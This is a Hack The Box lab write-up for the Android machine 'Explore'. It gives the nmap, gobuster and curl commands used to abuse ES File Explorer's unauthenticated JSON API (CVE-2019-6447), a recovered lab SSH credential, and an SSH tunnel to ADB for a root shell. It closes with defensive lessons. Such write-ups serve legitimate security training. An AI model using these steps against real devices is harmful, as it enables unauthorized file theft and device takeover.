# Explore

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Android |
| **Difficulty** | Easy |
| **IP Address** | 10.10.10.247 |
| **Status** | Retired |

## Overview
Explore is an easy-rated Android machine (an actual Android phone/emulator exposed on the network) rather than a traditional Linux/Windows target. The device runs the **ES File Explorer** app, which exposes an insecure JSON/HTTP API that allows an unauthenticated attacker to list and read files remotely. Enumerating the exposed file listing reveals SSH credentials for a device user (`kristi`), granting shell access. From there, the filtered Android Debug Bridge (ADB) port (5555) is tunneled over the existing SSH connection and used to obtain a privileged ADB shell, which on this device runs with root-equivalent access.

## Reconnaissance
A full-port `nmap -p- -sC -sV` scan against `10.10.10.247` returned:

```
2222/tcp  open     ssh     SSH-2.0-SSH Server - Banana Studio
5555/tcp  filtered freeciv                      (actually Android ADB, firewalled)
42135/tcp open     http    ES File Explorer Name Response httpd
46611/tcp open     unknown (Bukkit/Minecraft-style probe artifacts, likely a generic embedded HTTP responder)
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older (actually ES File Explorer's JSON API)
```

The `SSH Server - Banana Studio` banner on port 2222 and the `ES File Explorer Name Response httpd` service are strong indicators of an Android device (a phone or emulator) rather than a conventional server OS, and `nmap` itself flagged `Device: phone` in its OS fingerprint.

## Enumeration
`gobuster` against the web service on port 42135 enumerated typical Android filesystem-style directories exposed by ES File Explorer's file browser feature:

```
/cache   /bin   /data   /config   /lib   /product   /dev   /system   /d   /etc   /sys   /storage   /vendor
```

The real vulnerability, however, is in the JSONAPI service on port **59777**, which is ES File Explorer's known insecure remote file-management API (CVE-2019-6447 class of issue: unauthenticated command/file access). It accepts JSON POST commands such as:

```
curl --header "Content-Type: application/json" --request POST \
     --data '{"command":"listFiles"}' http://10.10.10.247:59777/[DIRECTORY]

curl --header "Content-Type: application/json" --request POST \
     --data '{"command":"[my_awesome_cmd]"}' http://10.10.10.247:59777
```

Listing files on the device surfaced a picture (screenshot) containing plaintext SSH credentials for the device user `kristi`, later confirmed to be:

```
kristi:Kr1sT!5h@Rp3xPl0r3!
```

## Foothold
Using the recovered credentials, an SSH session was opened to the Android SSH daemon on the non-standard port:

```
ssh -p 2222 kristi@explorer.htb
```

This provided a restricted shell as `kristi` on the Android device, allowing access to `user.txt`.

## Privilege Escalation
The Android Debug Bridge port (5555) was filtered from direct external access but reachable on the loopback interface of the device itself. The existing SSH session was used to create a local port forward, tunneling the filtered ADB port back to the attacker's machine:

```
ssh -p 2222 -L 5555:localhost:5555 kristi@explorer.htb
```

With ADB now reachable locally, connecting to it granted a privileged ADB shell:

```
adb connect localhost:5555
adb shell
```

On this device, the ADB shell provided root-equivalent access, allowing the root flag to be retrieved directly. A local Python helper (kept in this repo as `files/adb-tunnel-helper.py`) was drafted during the engagement to automate opening the SSH tunnel and probing the SSH/ADB banners, though the actual escalation was completed via the manual `ssh -L` + `adb connect` steps above.

## Lessons Learned
- ES File Explorer's JSONAPI service is a well-documented, unauthenticated file-disclosure/command vector on Android (tracked publicly as CVE-2019-6447) and should never be exposed to untrusted networks.
- Storing credentials in plaintext screenshots/images accessible via a file-browsing app is an easy way to leak sensitive data once any file-read primitive is available.
- Filtered/firewalled ports (like ADB on 5555) are not a substitute for actually disabling the service: SSH tunneling can still reach loopback-bound services once any foothold exists.
- Android devices exposed as HTB targets require the same network hygiene as any other host: unused debug/management interfaces (ADB, file-manager APIs) must be disabled in production.

## Tools & References
- `nmap` (full port range) for service discovery and OS/device fingerprinting.
- `gobuster` for directory enumeration of the ES File Explorer web service.
- `curl` for interacting with the ES File Explorer JSONAPI (port 59777).
- ES File Explorer JSONAPI vulnerability: CVE-2019-6447.
- OpenSSH client for the foothold and for the local port-forward used to reach ADB.
- Android Debug Bridge (`adb`) for the final privileged shell.
- `creds.jpg` (~1.2 MB screenshot showing the leaked `kristi` SSH credentials, recovered via the file-disclosure API): omitted from the repository as a large binary/image; the recovered credential is documented above.
- The empty `privesc/` folder created during the engagement (no content) was removed.
